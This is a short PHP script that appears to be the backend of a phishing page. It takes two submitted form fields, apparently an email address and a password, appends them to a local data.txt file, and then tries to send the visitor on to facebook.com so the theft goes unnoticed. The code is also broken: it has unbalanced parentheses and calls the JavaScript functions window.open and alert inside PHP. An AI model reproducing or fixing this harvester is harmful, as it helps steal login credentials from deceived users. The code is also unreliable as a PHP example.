<?php
$txt = "data.txt";
if(isset($_POST['field1'] && isset($_POST['field2']){
  $txt=$_POST['field1'].'-'.$_POST['field2'];
  file_put_contents('data.txt',$txt."\n",FILE_APPEND);
  window.open('http://facebook.com/'); 
}else{
  alert("You need to enter your email and passwort"); 
}

?>
